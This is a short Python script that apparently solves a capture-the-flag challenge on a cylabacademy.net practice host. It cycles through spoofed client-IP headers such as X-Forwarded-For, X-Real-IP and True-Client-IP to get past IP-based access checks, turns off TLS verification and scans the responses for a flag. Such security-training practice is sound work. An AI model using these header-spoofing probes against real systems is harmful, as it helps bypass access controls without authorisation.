import sys, re, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
base = "http://chatelaine.cylabacademy.net:29796"
headers_list = [
    {"X-Real-IP": "1.1.1.1"},
    {"X-Real-IP": "8.8.8.8"},
    {"X-Forwarded-For": "1.1.1.1"},
    {"X-Forwarded-For": "8.8.8.8"},
    {"X-Originating-IP": "1.1.1.1"},
    {"Client-IP": "1.1.1.1"},
    {"True-Client-IP": "1.1.1.1"},
    {"CF-Connecting-IP": "1.1.1.1"},
    {"Forwarded": "for=1.1.1.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-IP": "1.1.1.1"},
    {"X-Client-IP": "1.1.1.1"},
    {"X-ProxyUser-IP": "1.1.1.1"},
]
for h in headers_list:
    try:
        r = requests.get(base, headers={**h, "User-Agent": "Mozilla/5.0"}, timeout=12, verify=False)
        txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text or ""))
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text or "")
        print(f"{h} -> {txt[:120]!r}{' FLAG!' if m else ''}")
        if m:
            print("FLAG:", m.group(0))
            break
    except Exception as e:
        print(h, "err", type(e).__name__)
